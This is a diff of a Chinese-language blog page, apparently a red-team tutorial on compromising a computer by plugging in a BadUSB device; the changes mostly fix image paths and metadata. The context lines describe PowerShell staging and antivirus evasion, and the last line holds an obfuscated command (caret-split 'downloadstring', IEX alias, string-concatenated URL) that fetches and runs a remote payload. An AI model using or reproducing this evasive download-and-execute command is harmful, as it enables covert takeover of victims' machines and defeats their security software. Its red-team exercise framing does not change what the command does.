@@ -17,17 +17,17 @@
 <meta property="og:site_name" content="光与眼睛">
 <meta property="og:description" content="近源渗透—插U盘即可上线0x01前言攻防演练的时候有查U盘就能上线靶标电脑的操作（近源渗透），这种攻击手法虽然看着猥琐，但是是简单粗暴。今天团队的师傅写了一篇文章讲解这个攻击手法的原理，欢迎师傅们点赞分享。 0x02 准备阶段1、购买BadUsb 2、安装Arduino IDE 3、配置Arduino IDE ，添加开发板，安装驱动。 1参考链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png">
-<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-1.png">
-<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-2.png">
-<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-3.png">
-<meta property="og:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-4.png">
+<meta property="og:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-4972284.png">
+<meta property="og:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-1-4972308.png">
+<meta property="og:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-2-4972330.png">
+<meta property="og:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-3-4972337.png">
+<meta property="og:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-4-4972355.png">
 <meta property="article:published_time" content="2023-05-24T23:14:01.000Z">
-<meta property="article:modified_time" content="2023-05-24T23:38:42.079Z">
+<meta property="article:modified_time" content="2023-05-24T23:52:42.216Z">
 <meta property="article:author" content="光与眼睛">
 <meta property="article:tag" content="攻防">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://javb1.github.io/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png">
+<meta name="twitter:image" content="https://javb1.github.io/imgs/$%7Bfiilename%7D/640-4972284.png">
   
     <link rel="alternative" href="/atom.xml" title="光与眼睛" type="application/atom+xml">
   
@@ -271,15 +271,14 @@
 <p>2、powershell命令上线</p>
 <p>powershell上线也分两种方式</p>
 <p>(1)通过ps1文件上线</p>
-<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640.png" alt="640"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/640-4972284.png" alt="640"></p>
 <p>ps1文件免杀效果好，Github有很多针对ps1文件的免杀项目，可以轻松绕过国内主流杀软。</p>
-<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-1.png" alt="640-1"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/640-1-4972308.png" alt="640-1"></p>
 <p>但ps1文件庞大的代码量又带来了一个问题，在我们编写完成代码框架后，使用Arduino IDE进行编译，提示“当前已使用了45%的存储空间”，而如果我们将ps1文件中的全部代码编译，则会存在闪存空间不足的问题。</p>
-<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-2.png" alt="640-2"></p>
-<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-3.png" alt="640-3"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/640-2-4972330.png" alt="640-2"><img src="/imgs/$%7Bfiilename%7D/640-3-4972337.png" alt="640-3"></p>
 <p>有2种办法解决这个问题，使用钞能力购买闪存更大的开发板，或精简我们的ps1文件内容。至此通过ps1文件上线这个思路也在这里断了。</p>
 <p> (2)通过web服务上线</p>
-<p><img src="/Users/brandy/blog/source/imgs/$%7Bfiilename%7D/640-4.png" alt="640-4"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/640-4-4972355.png" alt="640-4"></p>
 <p>通过这种方法生成的payload较为精简，不存在闪存不足的问题，只需要针对性的做一下免杀即可。</p>
 <p>这里给出我免杀的方法，设置别名+^字符间隔+加号拼接字符串。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c echo set-alias -name xz -value IEX;x^z (New-Object &quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://19&#x27;+&#x27;2.168.1.1&#x27;+&#x27;/a&#x27;) | p^o^w^e^r^s^h^e^l^l -</span><br></pre></td></tr></table></figure>
